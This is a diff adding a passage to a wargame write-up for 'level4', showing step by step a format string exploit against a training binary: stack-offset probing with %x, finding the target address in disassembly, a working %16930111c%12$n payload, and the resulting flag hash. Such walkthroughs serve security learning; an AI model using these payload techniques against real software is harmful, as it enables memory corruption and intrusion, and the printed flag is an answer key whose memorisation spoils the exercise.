@@ -8,3 +8,20 @@ The `level4` is almost the same as `level3`, a very basic main that call a funct
 0x080484b2 <+11>:	leave
 0x080484b3 <+12>:	ret
 ```
+We will be usding the same strategy from `level3` __*format string exploit*__, bear in mind that this time we will need to set a variable to a very higher value, in `level3` was just *64* while in `level4` the value is `0x1025544 (16930116)` so we will need to modify a bit our strategy, but if I remember well when I coded my own version of `printf()` *(I would have never imagined this project would help me in this way :p)* the `printf()` function has an option for `padding` and that's what we're  gonna use here to generate those extra `16930112` characters *(Yeah I'm not kidding)*, let's start to find the __offset__ for our __address__
+```
+~$ echo "AAAA %x %x %x %x %x %x" | ./level4
+AAAA b7ff26b0 bffff744 b7fd0ff4 0 0 bffff708
+~$ echo "AAAA %x %x %x %x %x %x %x %x" | ./level4
+AAAA b7ff26b0 bffff744 b7fd0ff4 0 0 bffff708 804848d bffff500
+~$ echo "AAAA %x %x %x %x %x %x %x %x %x %x" | ./level4
+AAAA b7ff26b0 bffff744 b7fd0ff4 0 0 bffff708 804848d bffff500 200 b7fd1ac0
+~$ echo "AAAA %x %x %x %x %x %x %x %x %x %x %x %x" | ./level4
+AAAA b7ff26b0 bffff744 b7fd0ff4 0 0 bffff708 804848d bffff500 200 b7fd1ac0 b7ff37d0 41414141
+```
+A little bit harder but we could find it, checking the position we know our __address__ is being set on the stack at postion 12th so we get it done `%12\$n` and the address we have it from the disassembled code<br>
+`x0804848d <+54>:	mov    eax,ds:0x8049810`<br> Now we just need to build the *format string specifier*. <br>
+`(python -c "print('\x10\x98\x04\x08' + 'A' + '%16930111c' + '%12\$n')"; cat -) | ./level4`
+[...]
+after some 16930111 space later
+`0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a`
